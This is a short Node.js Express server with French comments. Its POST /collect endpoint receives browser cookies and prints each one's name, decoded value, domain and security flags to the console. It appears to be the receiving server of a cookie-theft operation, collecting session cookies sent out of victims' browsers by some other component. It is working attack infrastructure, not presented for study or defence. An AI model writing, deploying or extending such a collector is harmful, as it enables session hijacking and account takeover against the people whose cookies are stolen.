const express = require("express");
const app = express();

app.use(express.json());

function safeDecode(value) {
  try {
    return decodeURIComponent(value);
  } catch {
    return value;
  }
}

app.post("/collect", (req, res) => {
  const cookies = req.body.cookies;

  const now = new Date();
  console.log("\n==============================");
  console.log("🍪 NOUVELLE RÉCUPÉRATION");
  console.log("📅", now.toLocaleDateString("fr-FR"));
  console.log("⏰", now.toLocaleTimeString("fr-FR"));
  console.log("==============================");

  // 🟢 CAS 1 : cookies est un TABLEAU (cas normal)
  if (Array.isArray(cookies)) {
    cookies.forEach((cookie, index) => {
      console.log(`\nCookie ${index + 1}`);
      console.log("Nom      :", cookie.name);
      console.log("Valeur   :", safeDecode(cookie.value));
      console.log("Domaine  :", cookie.domain);
      console.log("Secure   :", cookie.secure);
      console.log("HttpOnly :", cookie.httpOnly);
    });

  // 🟡 CAS 2 : cookies est une STRING
  } else if (typeof cookies === "string") {
    console.log("\n⚠️ Cookies reçus sous forme de texte");
    console.log(safeDecode(cookies));

  // 🔴 CAS 3 : rien reçu
  } else {
    console.log("\n❌ Aucun cookie valide reçu");
    console.log("Type reçu :", typeof cookies);
  }

  res.json({ status: "ok" });
});

app.get("/", (req, res) => {
  res.send("Le serveur fonctionne !");
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
